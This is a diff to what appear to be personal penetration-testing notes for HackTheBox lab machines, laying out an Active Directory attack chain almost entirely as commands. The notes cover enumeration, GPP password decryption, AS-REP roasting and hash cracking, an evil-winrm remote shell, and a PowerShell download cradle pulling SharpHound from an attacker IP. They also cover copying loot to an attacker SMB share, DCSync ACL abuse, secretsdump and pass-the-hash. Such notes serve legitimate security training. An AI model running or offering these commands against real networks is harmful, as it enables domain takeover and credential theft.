@@ -11,29 +11,30 @@
 10. `smbclient -N -L //10.10.10.161`.
 11. If you find some DFS replication, search for "group.xml" or similar file with similar stuff, might find encrypted pssword.
 12. If encrypted password found try and decrypt with `gpp-decrypt <cipher_text>`.  Reason "n 2012 Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low hanging fruit."
-13. Enumerate RCP `rpcclient -U "" -N 10.10.10.161`, if u get shell `enumdomusers`, put it in `user.txt`.
-14. Enumerate AD for users again `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U `.
-15. `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`.
-16. `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`, kerberoasting (get TGT without authentication).
-17. Now crach the hash `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`, or `john hash --fork=4 -w=<list>`
-18. `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` to get remote shell. port `5985` must be open.
-19. Now try to get information about privilge escalation.
-20. Run `neo4j`.
-21. Run `Bloodhound --no-sandbox` to open up webUI.
-22. OK now u need to transfer `Collection` scripts from the github repo to the victim.
-23. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
-24. Or directly run exe.
-25. `bloodhound-python -d htb.local -usvc-afresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161`, it dumps a zip file, get it and load it webUI.
-26. With sharphound.exe `\s.exe --domain egotistical-bank.local --ldapusername <username> --ldappassword <Password> -c all`.
-27. How to load the zip ? In attacker run `impacket-smbserver  share . -smb2support -username df -password df`
-28. Use the share from the victim `net use \\10.10.14.6\share /u:df df`. and upload `copy 20191018035324_BloodHound.zip \\10.10.14.6\share\`
-29. In Bloodhound web UI, click on admin, and check `find shortest path to `, check permissions and group permission.
-30. Dsync attack `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` ?
-31. `aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161` automates the whole process.
-32. `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161` get hashes.
-33. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
-34. Another way or privilige escalatoin `https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md`.
-35. If u have user who can see NTUSER.dat, `impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175` to get password hashes.
+13. If the user/password we get is service account and can not login, we can `impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100` to get list of usernames, we do kerberoasting later on.
+14. Enumerate RCP `rpcclient -U "" -N 10.10.10.161`, if u get shell `enumdomusers`, put it in `user.txt`.
+15. Enumerate AD for users again `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U `.
+16. `python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`.
+17. `for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done`, kerberoasting (get TGT without authentication).
+18. Now crach the hash `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`, or `john hash --fork=4 -w=<list>`
+19. `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice` to get remote shell. port `5985` must be open.
+20. Now try to get information about privilge escalation.
+21. Run `neo4j`.
+22. Run `Bloodhound --no-sandbox` to open up webUI.
+23. OK now u need to transfer `Collection` scripts from the github repo to the victim.
+24. Load Bloodhound `iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")`.
+25. Or directly run exe.
+26. `bloodhound-python -d htb.local -usvc-afresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161`, it dumps a zip file, get it and load it webUI.
+27. With sharphound.exe `\s.exe --domain egotistical-bank.local --ldapusername <username> --ldappassword <Password> -c all`.
+28. How to load the zip ? In attacker run `impacket-smbserver  share . -smb2support -username df -password df`
+29. Use the share from the victim `net use \\10.10.14.6\share /u:df df`. and upload `copy 20191018035324_BloodHound.zip \\10.10.14.6\share\`
+30. In Bloodhound web UI, click on admin, and check `find shortest path to `, check permissions and group permission.
+31. Dsync attack `Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync` ?
+32. `aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161` automates the whole process.
+33. `impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161` get hashes.
+34. `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161` use the hash, usernae and ip to get remote shell.
+35. Another way or privilige escalatoin `https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md`.
+36. If u have user who can see NTUSER.dat, `impacket-secretsdump egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175` to get password hashes.
 # Initial Attack Vector
 ### LLMNR Poisoning
  - Link Local Multicast Name Resolution.
